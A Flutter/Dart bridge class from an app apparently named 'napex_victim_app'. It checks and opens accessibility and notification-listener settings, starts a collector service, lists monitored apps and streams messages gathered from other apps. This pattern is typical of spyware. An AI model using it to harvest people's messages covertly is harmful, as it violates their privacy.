import 'dart:async';

import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';

import 'package:napex_victim_app/core/constants/channel_constants.dart';
import 'package:napex_victim_app/core/utils/logger.dart';
import 'package:napex_victim_app/domain/entities/message.dart';

/// جسر قناة جمع الرسائل مع الجانب الأصلي (Kotlin)
///
/// - MethodChannel: أوامر (فحص الخدمات، فتح الإعدادات، بدء/إيقاف الخدمة)
/// - EventChannel: بث الرسائل المُجمَّعة من خدمات النظام
class MessageCollectorChannel {
  static final MessageCollectorChannel _instance =
      MessageCollectorChannel._internal();

  factory MessageCollectorChannel() => _instance;

  MessageCollectorChannel._internal();

  static const MethodChannel _methodChannel = MethodChannel(
    ChannelConstants.messageCollectorMethodChannel,
  );
  static const EventChannel _eventChannel = EventChannel(
    ChannelConstants.messageCollectorEventChannel,
  );

  final StreamController<CollectedMessage> _messageController =
      StreamController<CollectedMessage>.broadcast();

  bool _listening = false;
  bool get _isAndroid => defaultTargetPlatform == TargetPlatform.android;

  /// بث الرسائل المُجمَّعة
  Stream<CollectedMessage> get messages {
    _ensureListening();
    return _messageController.stream;
  }

  void _ensureListening() {
    if (_listening || !_isAndroid) return;
    _listening = true;

    _eventChannel.receiveBroadcastStream().listen(
      (event) {
        if (event is Map) {
          try {
            _messageController.add(
              CollectedMessage.fromNativeMap(
                Map<dynamic, dynamic>.from(event),
              ),
            );
          } catch (e) {
            AppLogger.error('Bad native message', tag: 'Channel', error: e);
          }
        }
      },
      onError: (Object error) {
        _listening = false;
        AppLogger.error('EventChannel error', tag: 'Channel', error: error);
      },
      cancelOnError: false,
    );
  }

  // ============ Method Calls ============

  Future<bool> isAccessibilityEnabled() async {
    return await _invoke<bool>(
      ChannelConstants.methodIsAccessibilityEnabled,
      fallback: true,
    );
  }

  Future<bool> isNotificationListenerEnabled() async {
    return await _invoke<bool>(
      ChannelConstants.methodIsNotificationListenerEnabled,
      fallback: true,
    );
  }

  /// فتح إعدادات إمكانية الوصول — يعيد true عند نجاح فتح الصفحة فعلاً
  Future<bool> openAccessibilitySettings() =>
      _invoke<bool>(ChannelConstants.methodOpenAccessibilitySettings, fallback: false);

  /// فتح إعدادات الاستماع للإشعارات — يعيد true عند نجاح فتح الصفحة فعلاً
  Future<bool> openNotificationSettings() =>
      _invoke<bool>(ChannelConstants.methodOpenNotificationSettings, fallback: false);

  Future<void> startCollectorService() =>
      _invoke<void>(ChannelConstants.methodStartCollector);

  Future<void> stopCollectorService() =>
      _invoke<void>(ChannelConstants.methodStopCollector);

  Future<bool> isCollectorServiceRunning() async {
    return await _invoke<bool>('isCollectorServiceRunning', fallback: false);
  }

  Future<List<String>> getMonitoredApps() async {
    final result = await _invoke<List<dynamic>>(
      ChannelConstants.methodGetMonitoredApps,
      fallback: const <dynamic>[],
    );
    return result.cast<String>();
  }

  /// استدعاء موحّد مع حماية من غياب تطبيق المنصة
  Future<T> _invoke<T>(String method, {T? fallback}) async {
    if (!_isAndroid) return fallback as T;
    try {
      return await _methodChannel.invokeMethod<T>(method) ?? fallback as T;
    } on MissingPluginException {
      return fallback as T;
    } on PlatformException catch (e) {
      AppLogger.error('$method failed: ${e.message}', tag: 'Channel');
      rethrow;
    }
  }
}
